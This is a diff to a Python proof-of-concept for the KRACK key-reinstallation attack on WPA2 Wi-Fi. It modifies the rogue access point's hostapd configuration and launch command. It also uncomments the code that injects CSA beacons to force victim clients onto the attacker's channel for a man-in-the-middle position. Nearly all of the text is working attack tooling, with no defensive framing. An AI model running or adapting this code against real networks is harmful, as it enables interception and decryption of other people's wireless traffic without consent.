@@ -99,11 +99,10 @@ wpa={wpaver}
 wpa_key_mgmt={akms}
 wpa_pairwise={pairwise}
 rsn_pairwise={pairwise}
-rsn_ptksa_counters={ptksa_counters}
-rsn_gtksa_counters={gtksa_counters}
+
 
 wmm_enabled={wmmenabled}
-wmm_advertised={wmmadvertised}
+
 hw_mode=g
 auth_algs=3
 wpa_passphrase={password}"""
@@ -629,7 +628,8 @@ class KRAckAttack():
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
-		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		# /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd
+		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
@@ -642,8 +642,8 @@ class KRAckAttack():
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
-		# self.send_csa_beacon(numbeacons=4)
-		# subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
+		self.send_csa_beacon(numbeacons=4)
+		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		# dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
@@ -711,12 +711,7 @@ def cleanup():
 	attack.stop()
 
 if __name__ == "__main__":
-	description = textwrap.dedent(
-		"""\
-		Key Reinstallation Attacks (KRACKs) by Mathy Vanhoef
-		-----------------------------------------------------------
-		  - Uses CSA beacons to obtain channel-based MitM position
-		  - Can detect and handle wpa_supplicant all-zero key installations""")
+	description = textwrap.dedent("""Uses CSA beacons to obtain channel-based MitM position""")
 	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
 	# 必要的參數
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
@@ -739,7 +734,7 @@ if __name__ == "__main__":
 	global_log_level = max(ALL, global_log_level - args.debug)
 	set_global_log_level2(max(ALL, global_log_level - args.debug))
 
-	print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]====\n")
+	print("\n\t===[ channel-based MitM position by Mathy Vanhoef ]====\n")
 	attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
